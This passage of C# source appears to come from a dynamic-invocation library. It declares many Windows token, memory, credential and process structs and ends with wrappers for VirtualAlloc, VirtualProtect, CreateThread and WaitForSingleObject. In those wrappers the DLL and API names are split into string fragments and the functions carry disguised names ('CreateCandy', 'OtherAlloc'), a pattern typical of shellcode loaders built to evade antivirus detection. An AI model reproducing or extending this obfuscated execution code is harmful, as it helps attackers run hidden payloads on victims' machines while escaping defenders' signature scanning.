                MiniDumpWithTokenInformation = 0x00040000,
                MiniDumpWithModuleHeaders = 0x00080000,
                MiniDumpFilterTriage = 0x00100000,
                MiniDumpValidTypeFlags = 0x001fffff
            }
        }

        public class WinBase
        {
            [StructLayout(LayoutKind.Sequential)]
            public struct _SYSTEM_INFO
            {
                public UInt16 wProcessorArchitecture;
                public UInt16 wReserved;
                public UInt32 dwPageSize;
                public IntPtr lpMinimumApplicationAddress;
                public IntPtr lpMaximumApplicationAddress;
                public IntPtr dwActiveProcessorMask;
                public UInt32 dwNumberOfProcessors;
                public UInt32 dwProcessorType;
                public UInt32 dwAllocationGranularity;
                public UInt16 wProcessorLevel;
                public UInt16 wProcessorRevision;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct _SECURITY_ATTRIBUTES
            {
                UInt32 nLength;
                IntPtr lpSecurityDescriptor;
                Boolean bInheritHandle;
            };
        }

        public class WinNT
        {
            public const UInt32 PAGE_NOACCESS = 0x01;
            public const UInt32 PAGE_READONLY = 0x02;
            public const UInt32 PAGE_READWRITE = 0x04;
            public const UInt32 PAGE_WRITECOPY = 0x08;
            public const UInt32 PAGE_EXECUTE = 0x10;
            public const UInt32 PAGE_EXECUTE_READ = 0x20;
            public const UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            public const UInt32 PAGE_EXECUTE_WRITECOPY = 0x80;
            public const UInt32 PAGE_GUARD = 0x100;
            public const UInt32 PAGE_NOCACHE = 0x200;
            public const UInt32 PAGE_WRITECOMBINE = 0x400;
            public const UInt32 PAGE_TARGETS_INVALID = 0x40000000;
            public const UInt32 PAGE_TARGETS_NO_UPDATE = 0x40000000;

            public const UInt32 SEC_COMMIT = 0x08000000;
            public const UInt32 SEC_IMAGE = 0x1000000;
            public const UInt32 SEC_IMAGE_NO_EXECUTE = 0x11000000;
            public const UInt32 SEC_LARGE_PAGES = 0x80000000;
            public const UInt32 SEC_NOCACHE = 0x10000000;
            public const UInt32 SEC_RESERVE = 0x4000000;
            public const UInt32 SEC_WRITECOMBINE = 0x40000000;

            public const UInt32 SE_PRIVILEGE_ENABLED = 0x2;
            public const UInt32 SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1;
            public const UInt32 SE_PRIVILEGE_REMOVED = 0x4;
            public const UInt32 SE_PRIVILEGE_USED_FOR_ACCESS = 0x3;

            public const UInt64 SE_GROUP_ENABLED = 0x00000004L;
            public const UInt64 SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002L;
            public const UInt64 SE_GROUP_INTEGRITY = 0x00000020L;
            public const UInt32 SE_GROUP_INTEGRITY_32 = 0x00000020;
            public const UInt64 SE_GROUP_INTEGRITY_ENABLED = 0x00000040L;
            public const UInt64 SE_GROUP_LOGON_ID = 0xC0000000L;
            public const UInt64 SE_GROUP_MANDATORY = 0x00000001L;
            public const UInt64 SE_GROUP_OWNER = 0x00000008L;
            public const UInt64 SE_GROUP_RESOURCE = 0x20000000L;
            public const UInt64 SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010L;

            public enum _SECURITY_IMPERSONATION_LEVEL
            {
                SecurityAnonymous,
                SecurityIdentification,
                SecurityImpersonation,
                SecurityDelegation
            }

            public enum TOKEN_TYPE
            {
                TokenPrimary = 1,
                TokenImpersonation
            }

            public enum _TOKEN_ELEVATION_TYPE
            {
                TokenElevationTypeDefault = 1,
                TokenElevationTypeFull,
                TokenElevationTypeLimited
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct _MEMORY_BASIC_INFORMATION32
            {
                public UInt32 BaseAddress;
                public UInt32 AllocationBase;
                public UInt32 AllocationProtect;
                public UInt32 RegionSize;
                public UInt32 State;
                public UInt32 Protect;
                public UInt32 Type;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct _MEMORY_BASIC_INFORMATION64
            {
                public UInt64 BaseAddress;
                public UInt64 AllocationBase;
                public UInt32 AllocationProtect;
                public UInt32 __alignment1;
                public UInt64 RegionSize;
                public UInt32 State;
                public UInt32 Protect;
                public UInt32 Type;
                public UInt32 __alignment2;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct _LUID_AND_ATTRIBUTES
            {
                public _LUID Luid;
                public UInt32 Attributes;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct _LUID
            {
                public UInt32 LowPart;
                public UInt32 HighPart;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct _TOKEN_STATISTICS
            {
                public _LUID TokenId;
                public _LUID AuthenticationId;
                public UInt64 ExpirationTime;
                public TOKEN_TYPE TokenType;
                public _SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
                public UInt32 DynamicCharged;
                public UInt32 DynamicAvailable;
                public UInt32 GroupCount;
                public UInt32 PrivilegeCount;
                public _LUID ModifiedId;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct _TOKEN_PRIVILEGES
            {
                public UInt32 PrivilegeCount;
                public _LUID_AND_ATTRIBUTES Privileges;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct _TOKEN_MANDATORY_LABEL
            {
                public _SID_AND_ATTRIBUTES Label;
            }

            public struct _SID
            {
                public byte Revision;
                public byte SubAuthorityCount;
                public WinNT._SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
                public ulong[] SubAuthority;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct _SID_IDENTIFIER_AUTHORITY
            {
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6, ArraySubType = UnmanagedType.I1)]
                public byte[] Value;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct _SID_AND_ATTRIBUTES
            {
                public IntPtr Sid;
                public UInt32 Attributes;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct _PRIVILEGE_SET
            {
                public UInt32 PrivilegeCount;
                public UInt32 Control;
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
                public _LUID_AND_ATTRIBUTES[] Privilege;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct _TOKEN_USER
            {
                public _SID_AND_ATTRIBUTES User;
            }

            public enum _SID_NAME_USE
            {
                SidTypeUser = 1,
                SidTypeGroup,
                SidTypeDomain,
                SidTypeAlias,
                SidTypeWellKnownGroup,
                SidTypeDeletedAccount,
                SidTypeInvalid,
                SidTypeUnknown,
                SidTypeComputer,
                SidTypeLabel
            }

            public enum _TOKEN_INFORMATION_CLASS
            {
                TokenUser = 1,
                TokenGroups,
                TokenPrivileges,
                TokenOwner,
                TokenPrimaryGroup,
                TokenDefaultDacl,
                TokenSource,
                TokenType,
                TokenImpersonationLevel,
                TokenStatistics,
                TokenRestrictedSids,
                TokenSessionId,
                TokenGroupsAndPrivileges,
                TokenSessionReference,
                TokenSandBoxInert,
                TokenAuditPolicy,
                TokenOrigin,
                TokenElevationType,
                TokenLinkedToken,
                TokenElevation,
                TokenHasRestrictions,
                TokenAccessInformation,
                TokenVirtualizationAllowed,
                TokenVirtualizationEnabled,
                TokenIntegrityLevel,
                TokenUIAccess,
                TokenMandatoryPolicy,
                TokenLogonSid,
                TokenIsAppContainer,
                TokenCapabilities,
                TokenAppContainerSid,
                TokenAppContainerNumber,
                TokenUserClaimAttributes,
                TokenDeviceClaimAttributes,
                TokenRestrictedUserClaimAttributes,
                TokenRestrictedDeviceClaimAttributes,
                TokenDeviceGroups,
                TokenRestrictedDeviceGroups,
                TokenSecurityAttributes,
                TokenIsRestricted,
                MaxTokenInfoClass
            }


            [Flags]
            public enum ACCESS_MASK : uint
            {
                DELETE = 0x00010000,
                READ_CONTROL = 0x00020000,
                WRITE_DAC = 0x00040000,
                WRITE_OWNER = 0x00080000,
                SYNCHRONIZE = 0x00100000,
                STANDARD_RIGHTS_REQUIRED = 0x000F0000,
                STANDARD_RIGHTS_READ = 0x00020000,
                STANDARD_RIGHTS_WRITE = 0x00020000,
                STANDARD_RIGHTS_EXECUTE = 0x00020000,
                STANDARD_RIGHTS_ALL = 0x001F0000,
                SPECIFIC_RIGHTS_ALL = 0x0000FFF,
                ACCESS_SYSTEM_SECURITY = 0x01000000,
                MAXIMUM_ALLOWED = 0x02000000,
                GENERIC_READ = 0x80000000,
                GENERIC_WRITE = 0x40000000,
                GENERIC_EXECUTE = 0x20000000,
                GENERIC_ALL = 0x10000000,
                DESKTOP_READOBJECTS = 0x00000001,
                DESKTOP_CREATEWINDOW = 0x00000002,
                DESKTOP_CREATEMENU = 0x00000004,
                DESKTOP_HOOKCONTROL = 0x00000008,
                DESKTOP_JOURNALRECORD = 0x00000010,
                DESKTOP_JOURNALPLAYBACK = 0x00000020,
                DESKTOP_ENUMERATE = 0x00000040,
                DESKTOP_WRITEOBJECTS = 0x00000080,
                DESKTOP_SWITCHDESKTOP = 0x00000100,
                WINSTA_ENUMDESKTOPS = 0x00000001,
                WINSTA_READATTRIBUTES = 0x00000002,
                WINSTA_ACCESSCLIPBOARD = 0x00000004,
                WINSTA_CREATEDESKTOP = 0x00000008,
                WINSTA_WRITEATTRIBUTES = 0x00000010,
                WINSTA_ACCESSGLOBALATOMS = 0x00000020,
                WINSTA_EXITWINDOWS = 0x00000040,
                WINSTA_ENUMERATE = 0x00000100,
                WINSTA_READSCREEN = 0x00000200,
                WINSTA_ALL_ACCESS = 0x0000037F,

                SECTION_ALL_ACCESS = 0x10000000,
                SECTION_QUERY = 0x0001,
                SECTION_MAP_WRITE = 0x0002,
                SECTION_MAP_READ = 0x0004,
                SECTION_MAP_EXECUTE = 0x0008,
                SECTION_EXTEND_SIZE = 0x0010
            };
        }

        public class ProcessThreadsAPI
        {
            [Flags]
            internal enum STARTF : uint
            {
                STARTF_USESHOWWINDOW = 0x00000001,
                STARTF_USESIZE = 0x00000002,
                STARTF_USEPOSITION = 0x00000004,
                STARTF_USECOUNTCHARS = 0x00000008,
                STARTF_USEFILLATTRIBUTE = 0x00000010,
                STARTF_RUNFULLSCREEN = 0x00000020,
                STARTF_FORCEONFEEDBACK = 0x00000040,
                STARTF_FORCEOFFFEEDBACK = 0x00000080,
                STARTF_USESTDHANDLES = 0x00000100,
            }


            [StructLayout(LayoutKind.Sequential)]
            public struct _STARTUPINFO
            {
                public UInt32 cb;
                public String lpReserved;
                public String lpDesktop;
                public String lpTitle;
                public UInt32 dwX;
                public UInt32 dwY;
                public UInt32 dwXSize;
                public UInt32 dwYSize;
                public UInt32 dwXCountChars;
                public UInt32 dwYCountChars;
                public UInt32 dwFillAttribute;
                public UInt32 dwFlags;
                public UInt16 wShowWindow;
                public UInt16 cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
            };


            [StructLayout(LayoutKind.Sequential)]
            public struct _STARTUPINFOEX
            {
                _STARTUPINFO StartupInfo;

            };


            [StructLayout(LayoutKind.Sequential)]
            public struct _PROCESS_INFORMATION
            {
                public IntPtr hProcess;
                public IntPtr hThread;
                public UInt32 dwProcessId;
                public UInt32 dwThreadId;
            };
        }

        public class WinCred
        {
#pragma warning disable 0618
            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            public struct _CREDENTIAL
            {
                public CRED_FLAGS Flags;
                public UInt32 Type;
                public IntPtr TargetName;
                public IntPtr Comment;
                public FILETIME LastWritten;
                public UInt32 CredentialBlobSize;
                public UInt32 Persist;
                public UInt32 AttributeCount;
                public IntPtr Attributes;
                public IntPtr TargetAlias;
                public IntPtr UserName;
            }
#pragma warning restore 0618

            public enum CRED_FLAGS : uint
            {
                NONE = 0x0,
                PROMPT_NOW = 0x2,
                USERNAME_TARGET = 0x4
            }

            public enum CRED_PERSIST : uint
            {
                Session = 1,
                LocalMachine,
                Enterprise
            }

            public enum CRED_TYPE : uint
            {
                Generic = 1,
                DomainPassword,
                DomainCertificate,
                DomainVisiblePassword,
                GenericCertificate,
                DomainExtended,
                Maximum,
                MaximumEx = Maximum + 1000,
            }
        }

        public class Secur32
        {
            public struct _SECURITY_LOGON_SESSION_DATA
            {
                public UInt32 Size;
                public WinNT._LUID LoginID;
                public _LSA_UNICODE_STRING Username;
                public _LSA_UNICODE_STRING LoginDomain;
                public _LSA_UNICODE_STRING AuthenticationPackage;
                public UInt32 LogonType;
                public UInt32 Session;
                public IntPtr pSid;
                public UInt64 LoginTime;
                public _LSA_UNICODE_STRING LogonServer;
                public _LSA_UNICODE_STRING DnsDomainName;
                public _LSA_UNICODE_STRING Upn;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct _LSA_UNICODE_STRING
            {
                public UInt16 Length;
                public UInt16 MaximumLength;
                public IntPtr Buffer;
            }
        }
    }

    public static class New
    {
        public static bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, ref uint lpflOldProtect) {
           object[] funcargs =
           {
                lpAddress, dwSize, flNewProtect, lpflOldProtect
           };

            bool retVal = (bool)Gen.HowToLiveALife(@"k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l", @"Vi"+ "rt" + "ua" + "lP" + "ro" +"te" + "ct", typeof(Delegates.VirtualProtect), ref funcargs);

            lpflOldProtect = (uint)funcargs[3];

            return retVal;
        }

        public static IntPtr OtherAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)
        {
        object[] funcargs =
        {
            lpAddress, dwSize, flAllocationType, flProtect
        };

        IntPtr retVal = (IntPtr)Gen.HowToLiveALife(@"kernel32.dll", @"Virt" + "ualA" + "lloc", typeof(Delegates.VirtualAlloc), ref funcargs);
        
        return retVal;

        }

        public static IntPtr CreateCandy(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)
        {
    // Craft an array for the arguments
        object[] funcargs =
        {
            lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId
        };

        IntPtr retVal = (IntPtr)Gen.HowToLiveALife(@"kernel32.dll", @"CreateTh" + "read", typeof(Delegates.CreateThread), ref funcargs);

        return retVal;

        }
    
        public static UInt32 WaitForCandy(IntPtr hHandle, UInt32 dwMilliseconds)
        {
        object[] funcargs =
        {
            hHandle, dwMilliseconds
        };

        UInt32 retVal = (UInt32)Gen.HowToLiveALife(@"kernel32.dll", @"WaitForSin" + "gleObject", typeof(Delegates.WaitForSingleObject), ref funcargs);

        return retVal;
        }

        private static class Delegates {
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        }
    }
}
